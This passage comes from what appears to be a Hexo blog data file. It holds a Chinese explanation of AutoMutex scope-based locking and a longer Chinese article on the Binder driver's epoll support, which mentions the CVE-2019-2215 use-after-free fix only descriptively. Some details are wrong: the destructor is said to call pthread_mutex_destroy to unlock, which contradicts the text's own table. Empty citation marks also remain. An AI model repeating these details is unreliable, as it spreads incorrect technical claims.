class=\"keyword\">explicit</span> <span class=\"title\">Mutex</span><span class=\"params\">(<span class=\"type\">int</span> type, <span class=\"type\">const</span> <span class=\"type\">char</span>* name = <span class=\"literal\">nullptr</span>)</span></span>;</span><br><span class=\"line\">    ~<span class=\"built_in\">Mutex</span>();</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// lock or unlock the mutex</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"type\">status_t</span> <span class=\"title\">lock</span><span class=\"params\">()</span> <span class=\"title\">ACQUIRE</span><span class=\"params\">()</span></span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">unlock</span><span class=\"params\">()</span> <span class=\"title\">RELEASE</span><span class=\"params\">()</span></span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"type\">pthread_mutex_t</span> mMutex;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">inline</span> <span class=\"type\">status_t</span> <span class=\"title\">Mutex::lock</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> -<span class=\"built_in\">pthread_mutex_lock</span>(&amp;mMutex);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">inline</span> Mutex::~<span class=\"built_in\">Mutex</span>() &#123;</span><br><span class=\"line\">    <span class=\"built_in\">pthread_mutex_destroy</span>(&amp;mMutex);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>调用逻辑就是：</p>\n<ol>\n<li>声明一个 AutoMutex 变量，也就是Autolock -&gt; Mutex&amp; mLock;</li>\n<li>Mutex&amp; mLock 变量，mLock-&gt;pthread_mutex_t </li>\n<li>AutoMutex _l(gDefaultServiceManagerLock); 构造时，调用pthread_mutex_lock 加锁；</li>\n<li>变量 _l,在作用域结束后，会调用其析构函数,从而调用pthread_mutex_destroy ，从而自动解锁；<br>附录：<h2 id=\"作用域\"><a href=\"#作用域\" class=\"headerlink\" title=\"作用域\"></a>作用域</h2></li>\n</ol>\n<p>✅ 什么是作用域？<br>    •    在 C++ 中，作用域是 { … } 大括号包围的代码块。<br>    •    变量（比如 AutoMutex _l）的生命周期限定在这个代码块内。<br>    •    一旦出了这个作用域，变量会被自动析构（即释放资源）。</p>\n<p>⸻</p>\n<p>🎯 AutoMutex 的作用域在哪？</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">    AutoMutex _l(gDefaultServiceManagerLock);</span><br><span class=\"line\">    ...</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<pre><code>•    开始：AutoMutex _l(...) 这一行\n•    结束：紧接着的 &#125; 结束大括号\n•    这个作用域内加锁，退出作用域时自动解锁\n</code></pre>\n<p>⸻</p>\n<p>🔄 生命周期过程图解</p>\n<p>defaultServiceManager()<br>┌────────────────────────────────────────────┐<br>│ if (gDefaultServiceManager != nullptr) …│ ← 已初始化直接返回<br>├────────────────────────────────────────────┤<br>│ {                                          │ ← 进入作用域（加锁）<br>│   AutoMutex _l(lock);                      │ ← 构造，加锁<br>│   while (…) { … }                      │<br>│ }                                          │ ← 退出作用域（析构 -&gt; 解锁）<br>├────────────────────────────────────────────┤<br>│ return gDefaultServiceManager;            │<br>└────────────────────────────────────────────┘</p>\n<p>⸻</p>\n<p>🚦 为什么不整个函数都锁住？<br>    •    如果把 AutoMutex _l(…) 放在函数顶部，即使变量已初始化，也会加锁等待，浪费性能。<br>    •    通过作用域限制，只在 gDefaultServiceManager 为 nullptr 时才加锁，更高效。</p>\n<p>⸻</p>\n<p>✅ 总结表格<br>问题    解答<br>AutoMutex 的作用域是？    包围其定义的大括号 { … }<br>何时开始和结束？    从 AutoMutex _l(…) 开始，到其对应的 } 结束<br>为何用作用域包住？    自动加解锁，确保线程安全，同时提高性能<br>退出作用域后会发生什么？    调用 ~AutoMutex() → 自动调用 unlock() 解锁<br>⸻</p>\n"},{"_content":"Binder驱动中 epoll 实现方式详解\n\nepoll 在 Binder 驱动中的应用场景和目的\n\n在 Android 系统中，Binder 驱动负责不同进程间的进程内通信。传统情况下，Binder 线程通过调用 ioctl (BINDER_WRITE_READ) 进入阻塞等待，有事务时再被内核唤醒 ￼。然而，对于某些场景（例如 Service Manager 或主线程需要同时处理多种事件源），让线程长时间阻塞于 Binder 可能不合适 ￼。为此，Binder 驱动提供了 epoll 支持，允许用户进程将 Binder 的文件描述符加入 epoll 事件循环，从而在不专门阻塞等待的情况下得到 Binder 事件通知 ￼。通过 epoll，应用可以将 /dev/binder 文件描述符与其他 IO 事件一起监视，主线程可以同时处理 UI、Socket 等事件以及 Binder 事务请求，实现高效的事件驱动模型 ￼。简而言之，epoll 在 Binder 中的目的在于提供异步事件通知机制：当有新的 Binder 事务或数据可读时，通过 epoll 触发回调或唤醒，从而避免线程一直阻塞等待，提高系统响应和资源利用率。\n\nbinder_poll 函数的源码解析\n\nbinder_poll 是 Binder 驱动实现的 poll 回调函数（在 binder_fops 文件操作结构体中注册为 .poll ￼）。当用户对 Binder 文件描述符调用 poll/epoll 时，该函数会被内核调用。binder_poll 的核心逻辑如下：\n\t•\t获取/创建线程结构：首先，通过 filp->private_data 获取当前进程对应的 binder_proc，然后调用 binder_get_thread(proc) 获取当前内核线程对应的 binder_thread 结构。如果当前线程尚未有 binder_thread（首次调用），则会分配并初始化一个新的 binder_thread 对象 ￼ ￼。分配的新线程结构会初始化其各成员，包括将当前线程 PID 赋值，初始化工作队列等，尤其是调用 init_waitqueue_head(&thread->wait) 初始化该线程的等待队列 ￼ ￼。这样每个调用 Binder 的线程都有自己专属的等待队列 thread->wait。\n\t•\t设置线程状态：接着，Binder驱动将该线程标记为轮询模式：thread->looper |= BINDER_LOOPER_STATE_POLL ￼。这个标志表示线程正在通过 (e)poll 方式等待 Binder 事件。Binder 内核后续会据此判断唤醒逻辑（区分使用 epoll 的线程和传统阻塞等待的线程）。\n\t•\t登记等待队列：调用 poll_wait(filp, &thread->wait, wait) 将 Binder 驱动的等待队列注册到 poll 表中 ￼。这一行代码非常关键，它把 binder_thread->wait 等待队列添加到当前 poll 操作的等待列表中。当使用 epoll 时，内核实际上会借助 poll_wait 来挂钩等待队列：epoll 机制提供的回调（ep_ptable_queue_proc）会将一个自定义的等待队列项插入 thread->wait 中，以便后续唤醒 ￼。简单来说，执行到这里时，epoll 已经把自己的等待节点（带有 ep_poll_callback 回调的 wait_queue_t）添加到了 Binder 线程的等待队列 thread->wait 上 ￼。这一步确保了当 Binder 有事件时，epoll 可以收到通知。\n\t•\t检查是否有可读事件：binder_poll 最后检查 Binder 是否已有可处理的工作。如果当前线程有待处理的事务或消息，则返回 EPOLLIN 事件，表示文件描述符可读；否则返回 0，表示当前无事件 ￼。具体实现上，通过调用 binder_has_work(thread, wait_for_proc_work) 来判断：该函数会检查当前线程的任务队列以及进程的待办事务列表，根据线程是否空闲来决定是否有工作需要处理 ￼ ￼。如果 binder_has_work 返回真，则 binder_poll 返回 EPOLLIN ￼，否则返回 0。需要注意的是，即使返回 0，poll_wait 已经使当前线程进入 thread->wait 等待队列，因此内核会让调用 poll/epoll_wait 的线程进入休眠，等待该等待队列上的事件唤醒 ￼。\n\n综上，binder_poll 的源码实现确保：一方面，将 Binder 线程的等待队列与 epoll 机制关联，使epoll能够监听 Binder 事件；另一方面，在调用时即时返回当前是否有事件需要处理，从而支持水平触发或边沿触发的 epoll 语义 ￼。\n\nepoll_ctl 添加 Binder 文件描述符的注册流程\n\n当应用通过 epoll_ctl(epfd, EPOLL_CTL_ADD, binder_fd, &event) 将 Binder 文件描述符加入 epoll 兴趣列表时，内核会触发 Binder 驱动的 poll 方法注册过程。整个流程大致如下：\n\t1.\tepoll 发起注册：epoll_ctl 调用内核的 ep_insert 函数，为新监视的文件描述符创建内部的数据结构（如 struct epitem 等）。在此过程中，内核会调用被监视文件的 poll 回调以完成注册 ￼。\n\t2.\t调用 binder_poll：epoll 控制流程通过 file->f_op->poll 调用 Binder 驱动的 binder_poll 函数 ￼。正如上节分析的，binder_poll 内部首先确保当前线程有对应的 binder_thread（必要时分配）并标记 POLL 状态，然后执行 poll_wait 注册等待队列，最后返回当前事件状态 ￼。\n\t3.\tepoll 挂钩等待队列：当 binder_poll 调用了 poll_wait(filp, &thread->wait, wait) 时，epoll 提供的回调函数将执行 ￼ ￼。具体来说，epoll 的 poll_table 结构中 _qproc 指向 ep_ptable_queue_proc ￼。因此 poll_wait 会调用 ep_ptable_queue_proc(file, wait_queue_head_t *whead, poll_table *pt) ￼。该回调由 epoll 实现，用于将 epoll自身的等待项加入目标等待队列 ￼。在这个过程中，epoll 会分配一个 struct eppoll_entry（包含一个 wait_queue_t 条目）并初始化其回调为 ep_poll_callback ￼。然后，通过 add_wait_queue(whead, &pwq->wait) 将此等待项添加到 Binder 驱动提供的等待队列 whead（即 thread->wait）上 ￼。同时，epoll 将该 eppoll_entry 链入自身的管理链表，以备将来删除时使用 ￼ ￼。这一系列操作将 Binder 线程的等待队列与 epoll 事件绑定：epoll 现在“关注”着 binder_thread->wait 上的唤醒事件。\n\t4.\t初始事件检查：在完成等待队列挂钩后，Binder 的 binder_poll 会返回一个事件掩码（如 EPOLLIN 或 0） ￼。epoll 核心代码会据此决定是否立即将该 Binder 文件描述符视为“有事件”（例如如果返回 EPOLLIN，则可能立即触发epoll返回可读事件给用户)。如果返回0，则表示当前无事件，epoll不会把这个fd加入就绪队列，但已完成注册，等待后续唤醒。\n\n通过上述流程，epoll 完成了 Binder 文件描述符的注册。简而言之，在 epoll_ctl ADD 过程中，Binder 驱动的 binder_poll 被调用，并且 epoll 将自身等待节点挂入 Binder 线程的等待队列 ￼ ￼。从此，Binder 驱动的事件（例如新事务到来）就能够通过唤醒该等待队列来通知到 epoll。\n\nepoll 文件描述符与 Binder 驱动的挂钩初始化\n\nBinder 文件描述符与 epoll 的“挂钩”主要体现在 Binder 驱动初始化和线程初始化两个层面：\n\t•\t打开 Binder 设备 (binder_open)：当进程打开 /dev/binder 时，Binder 驱动会创建并初始化一个 binder_proc 结构表示该进程，并将其指针存储在文件结构的 private_data 字段中 ￼。这个 binder_proc 包含该进程的 Binder 全局状态（如进程任务队列、线程红黑树等）。binder_open 只是初始化 binder_proc，并未产生具体线程等待队列。\n\t•\t创建 Binder 线程 (binder_get_thread)：线程真正与 Binder 驱动挂钩发生在执行 binder 操作时，比如上文提到的 binder_poll 调用或 ioctl(BINDER_WRITE_READ) 时。binder_get_thread(proc) 函数在需要时分配 binder_thread 结构，将其加入 proc->threads 红黑树，并进行初始化 ￼。初始化过程中，特别重要的是 init_waitqueue_head(&thread->wait) ￼——这为该线程创建了一个内核等待队列头，用于后续阻塞和唤醒。还设置了 thread->pid、thread->task 等信息，并将新线程节点插入 proc->threads 结构中 ￼。可以认为，这一步将 Binder 驱动和具体线程关联起来，为该线程准备好了等待队列等同步机制。\n\t•\tepoll 挂钩 Binder 等待队列：在线程已存在且调用 binder_poll 时，Binder 驱动通过 poll_wait 提供了 thread->wait 给 epoll，epoll 随即将自己的等待项附加上去（见前节） ￼。从这一刻开始，Binder 的等待队列与 epoll 完成挂钩：epoll 文件描述符内部维护了指向 Binder 等待队列的引用，并依赖它来实现事件通知。\n\n经过上述初始化，Binder 驱动已经为 epoll 使用做好准备：Binder端有了特定线程的等待队列，epoll端也在该等待队列上注册了监听者。需要注意的是，如果Binder线程未通过 BC_REGISTER_LOOPER 等命令正式注册为Binder线程，也可以使用epoll机制等待Binder事件。但Binder驱动只有在线程标记了 BINDER_LOOPER_STATE_POLL（例如通过 binder_poll 设置）或进入等待状态时，才会将事务分发给它 ￼ ￼。因此通常在使用epoll前，会调用一次 binder_poll 或 BC_ENTER_LOOPER 等使线程登记到Binder驱动，确保Binder知道此线程存在并可被唤醒处理事务 ￼。\n\n线程等待 Binder 事件的阻塞过程\n\n在完成 epoll 注册后，用户空间线程会调用 epoll_wait 来等待事件，此时如果 Binder 没有立即可用的事件，线程将进入休眠阻塞等待。阻塞等待的实现机制如下：\n\t•\tepoll_wait 侧的阻塞：当 epoll_wait 被调用且当前没有任何就绪事件时，内核会将调用线程置于睡眠状态，并挂在所有关联等待队列上。其中就包括 Binder 线程的 wait 队列。由于先前 poll_wait 已将 epoll 的等待节点添加到 binder_thread->wait，调用线程现在实际上受控于这个等待队列：如果 thread->wait 上触发唤醒，epoll_wait 就会被唤醒 ￼ ￼。换句话说，Binder 的等待队列是 epoll_wait 能否继续的决定因素之一。调用线程会一直阻塞，直到 Binder 有新事务/数据（或其他监视的文件描述符有事件）将其唤醒，或者直到超时/信号发生。\n\t•\tBinder 内阻塞机制（对比）：值得对比的是，不使用 epoll 时，Binder 线程通常调用 ioctl(BINDER_WRITE_READ) 进入驱动读取流程，内部会调用 binder_wait_for_work() 阻塞等待 ￼。binder_wait_for_work 使用 prepare_to_wait(&thread->wait, &wait, TASK_INTERRUPTIBLE) 将当前线程挂到 thread->wait 队列，并调用 schedule() 休眠 ￼。如果有信号或被唤醒则跳出循环 ￼。可以看到，无论是 epoll 方式还是直接 ioctl 阻塞，本质上线程都睡在 binder_thread->wait 等待队列上。区别在于：epoll 情况下由 epoll 子系统管理休眠和唤醒；直接阻塞情况下由 Binder 驱动自身通过 schedule() 使线程睡眠。\n\n因此，在等待过程中，Binder 驱动扮演被动角色——线程要么通过 binder_wait_for_work 主动睡眠（传统模式），要么通过 epoll 机制间接睡眠。但无论哪种模式，线程阻塞的核心是在 binder_thread->wait 等待队列上挂起。当该等待队列收到唤醒信号时，线程将被调度恢复运行，开始处理 Binder 事务或返回 epoll 结果。\n\nBinder 事务到来后的唤醒机制\n\n当Binder驱动中有新的事务或事件到来时，必须唤醒在等待该事件的线程。Binder内核通过在适当时机调用等待队列唤醒函数来实现这一点。结合 epoll 的情况，唤醒机制包括以下几种路径：\n\t•\t直接唤醒特定线程：如果Binder检测到有目标线程正阻塞等待（非epoll模式下在waiting_threads列表中），驱动会选取相应线程并唤醒。典型情况是在有事务投递给特定进程时，Binder调用 binder_select_thread_ilocked(proc) 从等待线程列表挑选一个空闲线程 ￼，然后调用 binder_wakeup_thread_ilocked(proc, thread, sync=false) 唤醒它 ￼。在 binder_wakeup_thread_ilocked 内，如果传入了特定 thread，则直接执行 wake_up_interruptible(&thread->wait)（或其同步版本）将该线程从 thread->wait 队列上唤醒 ￼。这会解除线程的阻塞，无论线程是通过 binder_wait_for_work 睡眠还是通过 epoll 间接睡眠，都将被激活准备处理 Binder 事务。\n\t•\t唤醒使用 epoll 的线程：如果目标进程中没有传统阻塞等待的线程（或所有线程都忙于事务），但有线程处于 epoll 监听状态（即 BINDER_LOOPER_STATE_POLL 标记的线程），Binder 驱动会尝试唤醒它们。具体地，binder_wakeup_thread_ilocked(proc, thread=NULL, sync=false) 处理了这种情况：当未指定特定线程时，它会调用 binder_wakeup_poll_threads_ilocked(proc, sync) ￼。该函数遍历该进程的所有线程节点，如果线程的 looper 状态包含 BINDER_LOOPER_STATE_POLL 且线程空闲可处理新的事务（通过 binder_available_for_proc_work_ilocked 判断），则执行 wake_up_interruptible(&thread->wait) 将其唤醒 ￼。由于 epoll 的等待节点挂在这些线程的等待队列上，wake_up_interruptible 不仅会唤醒可能休眠的Binder线程（如果其正通过binder_wait_for_work阻塞），也会触发epoll注册的回调。对于通过epoll_wait等待的线程来说，这相当于内核调用了 epoll 的 ep_poll_callback，将Binder文件描述符标记为就绪并唤醒正在epoll_wait的线程 ￼ ￼。换句话说，Binder驱动对 thread->wait 的唤醒会通知到epoll机制，促使在epoll_wait中休眠的线程被唤醒并察觉Binder fd变为可读。\n\t•\t线程退出和清理：当Binder线程退出或进程关闭Binder fd时，也需要唤醒等待队列以通知epoll机制解除关联。历史上，由于Binder线程结构可能提前释放，而epoll仍持有其等待队列指针，这曾导致UAF漏洞 ￼。为了解决此问题，新版内核在线程释放时使用 wake_up_poll(&thread->wait, EPOLLHUP | POLLFREE) 来专门唤醒等待队列并通知epoll清理 ￼。代码中检查了如果线程标记了 POLL 状态且等待队列上有等待者，就调用 wake_up_poll 发出带有 EPOLLHUP|POLLFREE 标志的唤醒 ￼。epoll 收到 POLLFREE 后会从其内部链表中移除对应的等待队列项，防止再次访问已经释放的 Binder 等待队列 ￼。这一机制确保资源安全回收。\n\n综上，Binder 事务到来时，内核会根据线程状态选择适当方式唤醒：对于直接阻塞等待的线程，通过 wake_up_interruptible 直接唤醒 ￼；对于通过 epoll 等待的线程，通过同样的等待队列唤醒机制激活 epoll 回调 ￼。所有这些唤醒最终都作用于 binder_thread->wait 等待队列，实现了 Binder 驱动与 epoll 等待机制的联动。唤醒发生的位置散布于 Binder 驱动不同函数中，例如新事务入队时的 binder_wakeup_proc_ilocked -> binder_wakeup_thread_ilocked 调用，或线程退出时的 binder_thread_release 调用 ￼。核心点在于：每当 Binder 有新工作可处理，就会调用 wake_up...(&thread->wait) 将相关等待线程（无论直接等待还是epoll等待）唤醒。\n\nepoll 与 binder_thread 结构中 wait 字段的结合使用\n\nBinder 驱动的 binder_thread 结构中包含一个 wait 字段，其类型为 wait_queue_head_t，这是 Linux 内核等待队列的头部类型 ￼ ￼。这个等待队列在 Binder 通信中扮演了举足轻重的角色，也是 epoll 能够与 Binder 集成的关键所在。其结合使用方式总结如下：\n\t•\tBinder_thread.wait 的初始化和作用：每当有线程与 Binder 驱动交互（例如通过 binder_open 后第一次执行 binder 操作），Binder 内核会确保为该线程分配 binder_thread 并初始化其 wait 队列 ￼。该等待队列用于挂载所有等待此线程Binder事件的等待者。对普通Binder线程而言，wait 队列用于实现阻塞读取：线程在没有事务时在此队列睡眠，直到有事务时被唤醒 ￼。对使用epoll的线程而言，wait 队列同样是休眠挂钩点，只是由epoll代为管理休眠/唤醒。\n\t•\tepoll 将自身等待项挂接到 wait 队列：正如前文所述，当调用 binder_poll 时，内核通过 poll_wait 将epoll的等待项注册到 binder_thread.wait 队列 ￼ ￼。从那一刻起，Binder线程的等待队列同时服务于两种等待者：Binder自有的等待（如果线程也可能调用binder_wait_for_work阻塞）以及epoll的等待者。binder_thread.wait 成为了连接Binder驱动和epoll机制的纽带 ￼。值得注意的是，Binder线程即使没有直接阻塞在Binder驱动上，只要epoll在等待，同样是通过这个wait队列来感知事件的 ￼。\n\t•\t通过 wait 队列进行事件传递：当Binder进程收到新事务、回复或其他可读事件时，Binder驱动对目标线程的 wait 队列调用唤醒函数（如 wake_up_interruptible） ￼。由于epoll的等待节点在该队列上，这个唤醒会调用epoll的回调，将事件标记为就绪并唤醒在epoll_wait休眠的线程 ￼。与此同时，如果线程本身也在该等待队列睡眠（Binder传统阻塞模式），也会被直接唤醒执行。例如，Binder驱动的事务分发代码中，一旦将事务加入目标线程/进程的队列，立即调用 binder_wakeup_proc_ilocked，进而触发对 thread->wait 的唤醒 ￼ ￼。\n\t•\t生命周期管理：因为 epoll 持续持有对 binder_thread.wait 的引用，所以 Binder 驱动在线程终止时也通过该等待队列与 epoll 通信（使用 wake_up_poll(..., POLLFREE)）通知epoll清理 ￼。正常情况下，只要 Binder 文件描述符不关闭，binder_thread.wait 的生命周期与 Binder 文件一致，epoll 挂载在其上也是安全的 ￼。Binder 驱动的新版本通过 POLLFREE 机制消除了使用 epoll 可能导致的生命周期问题，确保在 binder_thread 释放前将等待队列上的 epoll 引用移除 ￼。\n\n总的来说，binder_thread 结构中的 wait 字段充当了 Binder 驱动与 epoll 的桥梁：Binder 利用它来挂起/唤醒等待事务的线程，epoll 利用它来监听 Binder 事件的发生。一边是 Binder 内核通过 wait_queue_head_t 实现同步和通知 ￼，另一边是 epoll 通过在该等待队列注册回调实现事件驱动 ￼。两者的结合，使得 Binder 机制可以无缝集成到 Linux 通用的 IO 多路复用框架中。这不仅提高了灵活性，也使 Android 主线程等可以采用统一的 epoll 循环来监听 Binder 和其它事件，从架构上提高了效率和可维护性。通过上述机制，Binder 驱动成功地支持了 epoll 的监视，达到了预期的应用场景和目的。\n\n**参考资料：**Binder 驱动源码 ￼ ￼；Android Binder线程模型分析 ￼ ￼；CVE-2019-2215 漏洞相关代码解读 ￼ ￼等。","source":"_drafts/epoll.md","raw":"Binder驱动中 epoll 实现方式详解\n\nepoll 在 Binder 驱动中的应用场景和目的\n\n在 Android 系统中，Binder 驱动负责不同进程间的进程内通信。传统情况下，Binder 线程通过调用 ioctl (BINDER_WRITE_READ) 进入阻塞等待，有事务时再被内核唤醒 ￼。然而，对于某些场景（例如 Service Manager 或主线程需要同时处理多种事件源），让线程长时间阻塞于 Binder 可能不合适 ￼。为此，Binder 驱动提供了 epoll 支持，允许用户进程将 Binder 的文件描述符加入 epoll 事件循环，从而在不专门阻塞等待的情况下得到 Binder 事件通知 ￼。通过 epoll，应用可以将 /dev/binder 文件描述符与其他 IO 事件一起监视，主线程可以同时处理 UI、Socket 等事件以及 Binder 事务请求，实现高效的事件驱动模型 ￼。简而言之，epoll 在 Binder 中的目的在于提供异步事件通知机制：当有新的 Binder 事务或数据可读时，通过 epoll 触发回调或唤醒，从而避免线程一直阻塞等待，提高系统响应和资源利用率。\n\nbinder_poll 函数的源码解析\n\nbinder_poll 是 Binder 驱动实现的 poll 回调函数（在 binder_fops 文件操作结构体中注册为 .poll ￼）。当用户对 Binder 文件描述符调用 poll/epoll 时，该函数会被内核调用。binder_poll 的核心逻辑如下：\n\t•\t获取/创建线程结构：首先，通过 filp->private_data 获取当前进程对应的 binder_proc，然后调用 binder_get_thread(proc) 获取当前内核线程对应的 binder_thread 结构。如果当前线程尚未有 binder_thread（首次调用），则会分配并初始化一个新的 binder_thread 对象 ￼ ￼。分配的新线程结构会初始化其各成员，包括将当前线程 PID 赋值，初始化工作队列等，尤其是调用 init_waitqueue_head(&thread->wait) 初始化该线程的等待队列 ￼ ￼。这样每个调用 Binder 的线程都有自己专属的等待队列 thread->wait。\n\t•\t设置线程状态：接着，Binder驱动将该线程标记为轮询模式：thread->looper |= BINDER_LOOPER_STATE_POLL ￼。这个标志表示线程正在通过 (e)poll 方式等待 Binder 事件。Binder 内核后续会据此判断唤醒逻辑（区分使用 epoll 的线程和传统阻塞等待的线程）。\n\t•\t登记等待队列：调用 poll_wait(filp, &thread->wait, wait) 将 Binder 驱动的等待队列注册到 poll 表中 ￼。这一行代码非常关键，它把 binder_thread->wait 等待队列添加到当前 poll 操作的等待列表中。当使用 epoll 时，内核实际上会借助 poll_wait 来挂钩等待队列：epoll 机制提供的回调（ep_ptable_queue_proc）会将一个自定义的等待队列项插入 thread->wait 中，以便后续唤醒 ￼。简单来说，执行到这里时，epoll 已经把自己的等待节点（带有 ep_poll_callback 回调的 wait_queue_t）添加到了 Binder 线程的等待队列 thread->wait 上 ￼。这一步确保了当 Binder 有事件时，epoll 可以收到通知。\n\t•\t检查是否有可读事件：binder_poll 最后检查 Binder 是否已有可处理的工作。如果当前线程有待处理的事务或消息，则返回 EPOLLIN 事件，表示文件描述符可读；否则返回 0，表示当前无事件 ￼。具体实现上，通过调用 binder_has_work(thread, wait_for_proc_work) 来判断：该函数会检查当前线程的任务队列以及进程的待办事务列表，根据线程是否空闲来决定是否有工作需要处理 ￼ ￼。如果 binder_has_work 返回真，则 binder_poll 返回 EPOLLIN ￼，否则返回 0。需要注意的是，即使返回 0，poll_wait 已经使当前线程进入 thread->wait 等待队列，因此内核会让调用 poll/epoll_wait 的线程进入休眠，等待该等待队列上的事件唤醒 ￼。\n\n综上，binder_poll 的源码实现确保：一方面，将 Binder 线程的等待队列与 epoll 机制关联，使epoll能够监听 Binder 事件；另一方面，在调用时即时返回当前是否有事件需要处理，从而支持水平触发或边沿触发的 epoll 语义 ￼。\n\nepoll_ctl 添加 Binder 文件描述符的注册流程\n\n当应用通过 epoll_ctl(epfd, EPOLL_CTL_ADD, binder_fd, &event) 将 Binder 文件描述符加入 epoll 兴趣列表时，内核会触发 Binder 驱动的 poll 方法注册过程。整个流程大致如下：\n\t1.\tepoll 发起注册：epoll_ctl 调用内核的 ep_insert 函数，为新监视的文件描述符创建内部的数据结构（如 struct epitem 等）。在此过程中，内核会调用被监视文件的 poll 回调以完成注册 ￼。\n\t2.\t调用 binder_poll：epoll 控制流程通过 file->f_op->poll 调用 Binder 驱动的 binder_poll 函数 ￼。正如上节分析的，binder_poll 内部首先确保当前线程有对应的 binder_thread（必要时分配）并标记 POLL 状态，然后执行 poll_wait 注册等待队列，最后返回当前事件状态 ￼。\n\t3.\tepoll 挂钩等待队列：当 binder_poll 调用了 poll_wait(filp, &thread->wait, wait) 时，epoll 提供的回调函数将执行 ￼ ￼。具体来说，epoll 的 poll_table 结构中 _qproc 指向 ep_ptable_queue_proc ￼。因此 poll_wait 会调用 ep_ptable_queue_proc(file, wait_queue_head_t *whead, poll_table *pt) ￼。该回调由 epoll 实现，用于将 epoll自身的等待项加入目标等待队列 ￼。在这个过程中，epoll 会分配一个 struct eppoll_entry（包含一个 wait_queue_t 条目）并初始化其回调为 ep_poll_callback ￼。然后，通过 add_wait_queue(whead, &pwq->wait) 将此等待项添加到 Binder 驱动提供的等待队列 whead（即 thread->wait）上 ￼。同时，epoll 将该 eppoll_entry 链入自身的管理链表，以备将来删除时使用 ￼ ￼。这一系列操作将 Binder 线程的等待队列与 epoll 事件绑定：epoll 现在“关注”着 binder_thread->wait 上的唤醒事件。\n\t4.\t初始事件检查：在完成等待队列挂钩后，Binder 的 binder_poll 会返回一个事件掩码（如 EPOLLIN 或 0） ￼。epoll 核心代码会据此决定是否立即将该 Binder 文件描述符视为“有事件”（例如如果返回 EPOLLIN，则可能立即触发epoll返回可读事件给用户)。如果返回0，则表示当前无事件，epoll不会把这个fd加入就绪队列，但已完成注册，等待后续唤醒。\n\n通过上述流程，epoll 完成了 Binder 文件描述符的注册。简而言之，在 epoll_ctl ADD 过程中，Binder 驱动的 binder_poll 被调用，并且 epoll 将自身等待节点挂入 Binder 线程的等待队列 ￼ ￼。从此，Binder 驱动的事件（例如新事务到来）就能够通过唤醒该等待队列来通知到 epoll。\n\nepoll 文件描述符与 Binder 驱动的挂钩初始化\n\nBinder 文件描述符与 epoll 的“挂钩”主要体现在 Binder 驱动初始化和线程初始化两个层面：\n\t•\t打开 Binder 设备 (binder_open)：当进程打开 /dev/binder 时，Binder 驱动会创建并初始化一个 binder_proc 结构表示该进程，并将其指针存储在文件结构的 private_data 字段中 ￼。这个 binder_proc 包含该进程的 Binder 全局状态（如进程任务队列、线程红黑树等）。binder_open 只是初始化 binder_proc，并未产生具体线程等待队列。\n\t•\t创建 Binder 线程 (binder_get_thread)：线程真正与 Binder 驱动挂钩发生在执行 binder 操作时，比如上文提到的 binder_poll 调用或 ioctl(BINDER_WRITE_READ) 时。binder_get_thread(proc) 函数在需要时分配 binder_thread 结构，将其加入 proc->threads 红黑树，并进行初始化 ￼。初始化过程中，特别重要的是 init_waitqueue_head(&thread->wait) ￼——这为该线程创建了一个内核等待队列头，用于后续阻塞和唤醒。还设置了 thread->pid、thread->task 等信息，并将新线程节点插入 proc->threads 结构中 ￼。可以认为，这一步将 Binder 驱动和具体线程关联起来，为该线程准备好了等待队列等同步机制。\n\t•\tepoll 挂钩 Binder 等待队列：在线程已存在且调用 binder_poll 时，Binder 驱动通过 poll_wait 提供了 thread->wait 给 epoll，epoll 随即将自己的等待项附加上去（见前节） ￼。从这一刻开始，Binder 的等待队列与 epoll 完成挂钩：epoll 文件描述符内部维护了指向 Binder 等待队列的引用，并依赖它来实现事件通知。\n\n经过上述初始化，Binder 驱动已经为 epoll 使用做好准备：Binder端有了特定线程的等待队列，epoll端也在该等待队列上注册了监听者。需要注意的是，如果Binder线程未通过 BC_REGISTER_LOOPER 等命令正式注册为Binder线程，也可以使用epoll机制等待Binder事件。但Binder驱动只有在线程标记了 BINDER_LOOPER_STATE_POLL（例如通过 binder_poll 设置）或进入等待状态时，才会将事务分发给它 ￼ ￼。因此通常在使用epoll前，会调用一次 binder_poll 或 BC_ENTER_LOOPER 等使线程登记到Binder驱动，确保Binder知道此线程存在并可被唤醒处理事务 ￼。\n\n线程等待 Binder 事件的阻塞过程\n\n在完成 epoll 注册后，用户空间线程会调用 epoll_wait 来等待事件，此时如果 Binder 没有立即可用的事件，线程将进入休眠阻塞等待。阻塞等待的实现机制如下：\n\t•\tepoll_wait 侧的阻塞：当 epoll_wait 被调用且当前没有任何就绪事件时，内核会将调用线程置于睡眠状态，并挂在所有关联等待队列上。其中就包括 Binder 线程的 wait 队列。由于先前 poll_wait 已将 epoll 的等待节点添加到 binder_thread->wait，调用线程现在实际上受控于这个等待队列：如果 thread->wait 上触发唤醒，epoll_wait 就会被唤醒 ￼ ￼。换句话说，Binder 的等待队列是 epoll_wait 能否继续的决定因素之一。调用线程会一直阻塞，直到 Binder 有新事务/数据（或其他监视的文件描述符有事件）将其唤醒，或者直到超时/信号发生。\n\t•\tBinder 内阻塞机制（对比）：值得对比的是，不使用 epoll 时，Binder 线程通常调用 ioctl(BINDER_WRITE_READ) 进入驱动读取流程，内部会调用 binder_wait_for_work() 阻塞等待 ￼。binder_wait_for_work 使用 prepare_to_wait(&thread->wait, &wait, TASK_INTERRUPTIBLE) 将当前线程挂到 thread->wait 队列，并调用 schedule() 休眠 ￼。如果有信号或被唤醒则跳出循环 ￼。可以看到，无论是 epoll 方式还是直接 ioctl 阻塞，本质上线程都睡在 binder_thread->wait 等待队列上。区别在于：epoll 情况下由 epoll 子系统管理休眠和唤醒；直接阻塞情况下由 Binder 